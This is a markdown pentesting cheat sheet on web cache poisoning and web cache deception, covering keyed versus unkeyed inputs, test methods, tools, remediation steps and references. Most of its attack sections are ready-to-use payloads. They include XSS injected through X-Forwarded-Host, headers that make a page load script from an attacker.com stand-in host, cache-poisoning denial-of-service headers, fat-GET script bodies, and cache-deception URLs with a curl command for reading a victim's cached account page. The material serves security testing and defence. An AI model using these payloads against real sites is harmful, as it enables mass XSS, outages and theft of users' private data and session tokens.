# Web Cache Poisoning & Cache Deception

Caches (CDNs, reverse proxies, Varnish, Cloudflare, Fastly, Akamai) serve a stored response to many users based on a **cache key** (usually method + host + path + a few query/headers). Two attack families abuse the gap between what the cache keys on and what the app actually uses:

- **Web Cache Poisoning** — inject a malicious response (via an *unkeyed* input) so the cache stores and serves it to *other* users (mass stored-XSS, redirects, DoS).
- **Web Cache Deception** — trick the cache into storing a victim's *private* response at a URL the attacker can then fetch (steal PII/tokens).

Both got major new research in 2024-2025 (PortSwigger "Gotta cache 'em all" / "Web Cache Entanglement" — parser-discrepancy techniques affecting many CDNs).

---

## Core concept: keyed vs unkeyed inputs

```text
Cache KEY (typically):   host + path + (some) query params + (sometimes) a few headers
UNKEYED (ignored by key but USED by app):
   X-Forwarded-Host, X-Forwarded-Scheme, X-Forwarded-For, X-Host, X-Original-URL,
   X-Forwarded-Server, X-Forwarded-Port, custom headers, sometimes extra query params,
   request body on "fat GET", cookies (often unkeyed)
```

If an unkeyed header influences the response, you poison the cached copy for everyone hitting that keyed URL.

---

## Cache Poisoning — methodology

### 1. Identify a cacheable response

```bash
curl -sI "https://TARGET/page" | grep -iE 'cache|age|x-cache|cf-cache|via'
# Tells: X-Cache: hit/miss, Age:, Cache-Control:, CF-Cache-Status: HIT
# Repeat the request; if the 2nd is served from cache (Age increments) -> cacheable
```

### 2. Find unkeyed inputs that change the response

Use a cache-buster query param (so you don't poison real users while testing) and probe headers:

```http
GET /page?cb=12345 HTTP/1.1
Host: TARGET
X-Forwarded-Host: canary.attacker.com
```

```bash
# Param Miner (Burp) automates header/param guessing for unkeyed reflections
# Manual:
for h in X-Forwarded-Host X-Host X-Forwarded-Scheme X-Original-URL X-Forwarded-For; do
  curl -s "https://TARGET/?cb=$RANDOM" -H "$h: canary1234.attacker.com" | grep -q canary1234 \
    && echo "REFLECTED unkeyed: $h"
done
```

### 3. Confirm reflection lands in a dangerous sink → poison

```http
# Reflected X-Forwarded-Host used to build absolute URLs / <script src>
GET / HTTP/1.1
Host: TARGET
X-Forwarded-Host: attacker.com"></script><script>alert(document.domain)</script>
# Response now references attacker.com / executes XSS; cache stores it -> all users hit
```

---

## Cache Poisoning — attack patterns

### Reflected XSS via unkeyed header

```http
X-Forwarded-Host: a."><script>alert(1)</script>
X-Host: evil.com
X-Forwarded-Scheme: nothttps     # may trigger a cached redirect loop / scheme-based XSS
```

### Redirect/host poisoning → load attacker resources

```http
X-Forwarded-Host: attacker.com
# App builds <script src="//{X-Forwarded-Host}/main.js"> -> serves attacker JS to all
```

### Cache poisoning DoS (CPDoS)

Make the origin return an error/oversized response that gets cached:

```http
# HTTP Header Oversize / Meta Character / Method Override
X-Oversized-Header: <very long value>     -> origin 400, cache stores 400 for everyone
X-HTTP-Method-Override: POST              -> cached 405
X-Forwarded-Scheme: nothttp               -> cached redirect/error
```

### Fat GET (body on a GET that the app reads but cache ignores)

```http
GET /page?cb=1 HTTP/1.1
Host: TARGET
Content-Length: 24

search=<script>alert(1)</script>
```

If the app reads the body but the cache keys only on the URL, you poison.

### Unkeyed query params / parameter cloaking

```text
?utm_source=...        often stripped from cache key but reflected
?param;extra=evil      ';' parsing differs between cache and app (PortSwigger parser-discrepancy)
?callback=evil         JSONP-style reflection
# Parameter cloaking: cache de-duplicates/normalizes params differently than origin
```

### Cache key normalization abuse

```text
- Cache lowercases/normalizes path but origin doesn't (or vice versa)
- /static/..%2f or //path tricks reach a cacheable extension while serving dynamic content
- Encoded chars decoded by one layer, not the other -> serve poisoned variant on clean URL
```

---

## Web Cache Deception

The cache stores private pages because of a rule like "cache everything ending in `.css/.js/.jpg`". Append a static-looking suffix to a dynamic, authenticated URL:

```text
https://TARGET/my-account            -> dynamic, per-user, normally not cached
https://TARGET/my-account/foo.css    -> origin ignores /foo.css, returns YOUR account page;
                                        cache sees ".css" -> stores it publicly
```

### Variants (parser discrepancies)

```text
/my-account.css                      (path confusion)
/my-account/%2e%2e/static/x.css      (traversal back to dynamic)
/my-account;foo.css                  (path parameter)
/my-account%00.css                   (null)
/my-account?.css                     (query)
/my-account#.css
/my-account/..%2fimg.png             (delimiter discrepancy)
/api/me/avatar.js
```

### Exploitation flow

```text
1. Craft the deception URL for a sensitive endpoint (/my-account/x.css).
2. Get the victim to load it while authenticated (phishing link, embedded resource).
3. Cache stores their private response.
4. Attacker fetches the same URL unauthenticated -> reads victim's PII/session/CSRF token.
```

```bash
# As attacker, after victim triggered caching:
curl -s "https://TARGET/my-account/x.css" | head    # contains victim's data
```

---

## Tooling

| Tool | Use |
|------|-----|
| **Burp Param Miner** | Discover unkeyed headers/params, automate cache-poisoning detection |
| **Burp Suite** | Cache-buster testing, build/confirm PoC, observe X-Cache/Age |
| **Web Cache Vulnerability Scanner (Hackmanit, `wcvs`)** | Automated poisoning & deception detection |
| **nuclei** | Some cache-poisoning templates |
| **curl + custom headers** | Manual confirmation |

```bash
# wcvs
wcvs -u https://TARGET -hw header-wordlist.txt
```

---

## Remediation

- **Cache only truly static, non-personalized content.** Don't cache responses to authenticated requests.
- Include every input that affects the response in the **cache key** (or have the app ignore unkeyed inputs entirely).
- Strip dangerous request headers (`X-Forwarded-Host`, etc.) at the edge before they reach the origin/cache.
- Normalize URLs/params consistently across cache and origin; resolve parser discrepancies.
- Use `Cache-Control: no-store / private` on personalized responses; set explicit `Vary`.
- Define caching by content-type/route allowlist, not by file-extension suffix matching (defeats deception).

---

## Cheatsheet

```text
# Is it cached?
curl -sI https://T/page | grep -iE 'x-cache|age|cf-cache'
# Find unkeyed header (with cache buster)
GET /?cb=RAND  + X-Forwarded-Host: canary.attacker.com  -> reflected?
# Poison XSS
X-Forwarded-Host: a."><script>alert(1)</script>
# CPDoS
X-Oversized-Header: AAAA...(8k)   /   X-HTTP-Method-Override: POST
# Fat GET
GET /?cb=1  body: search=<script>alert(1)</script>
# Cache DECEPTION
/my-account/x.css   /my-account;x.css   /my-account%00.css   /my-account/..%2fx.js
```

---

## References

- PortSwigger — Web cache poisoning: https://portswigger.net/web-security/web-cache-poisoning
- PortSwigger — Web cache deception: https://portswigger.net/web-security/web-cache-deception
- PortSwigger Research — Practical Web Cache Poisoning: https://portswigger.net/research/practical-web-cache-poisoning
- PortSwigger Research — Gotta cache 'em all (2024): https://portswigger.net/research/gotta-cache-em-all
- PortSwigger Research — Web Cache Entanglement: https://portswigger.net/research/web-cache-entanglement
- PayloadsAllTheThings — Web Cache Deception: https://swisskyrepo.github.io/PayloadsAllTheThings/Web%20Cache%20Deception/
- HackTricks — Cache poisoning & deception: https://hacktricks.wiki/en/pentesting-web/cache-deception/index.html
- Web Cache Vulnerability Scanner: https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner
